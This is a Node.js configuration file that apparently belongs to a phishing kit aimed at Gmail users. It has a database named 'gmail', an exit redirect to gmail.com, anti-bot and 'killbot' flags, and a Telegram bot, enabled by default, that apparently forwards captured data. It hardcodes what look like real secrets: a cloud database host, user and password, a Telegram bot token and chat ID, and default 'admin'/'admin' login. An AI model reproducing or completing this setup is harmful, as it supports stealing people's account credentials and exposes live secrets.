try { require('dotenv').config(); } catch(e) {}

const isVercel = !!process.env.VERCEL;

const config = {
  db: {
    host: isVercel ? 'gateway01.eu-central-1.prod.aws.tidbcloud.com' : (process.env.DB_HOST || 'localhost'),
    name: process.env.DB_NAME || 'gmail',
    user: isVercel ? '2oDcgQaxxbJjEZ7.root' : (process.env.DB_USER || 'root'),
    pass: isVercel ? 'GZMdRQCl9JaQdWsU' : (process.env.DB_PASS || ''),
    port: isVercel ? 4000 : parseInt(process.env.DB_PORT || '3306'),
    ssl: isVercel ? true : (process.env.DB_SSL === 'true' || false),
  },
  admin: {
    username: process.env.ADMIN_USERNAME || 'admin',
    password: process.env.ADMIN_PASSWORD || 'admin',
  },
  exitUrl: process.env.EXIT_URL || 'https://www.gmail.com',
  telegram: {
    enabled: process.env.TELEGRAM_ENABLED === 'true' || !process.env.TELEGRAM_ENABLED,
    chatId: process.env.TELEGRAM_CHAT_ID || '-1003973974864',
    botToken: process.env.TELEGRAM_BOT_TOKEN || '8693307313:AAEmsNZSETiqeqIvDdlvF47inoBfKc2q9jA',
  },
  mobileLock: false,
  ukLock: false,
  gateway: true,
  antibots: false,
  onetime: false,
  killbot: false,
  antibot: false,
  internalAntibot: false,
  sessionSecret: process.env.SESSION_SECRET || 'zynex-demo-secret-key-2025',
  port: parseInt(process.env.PORT || '3000'),
};

module.exports = config;
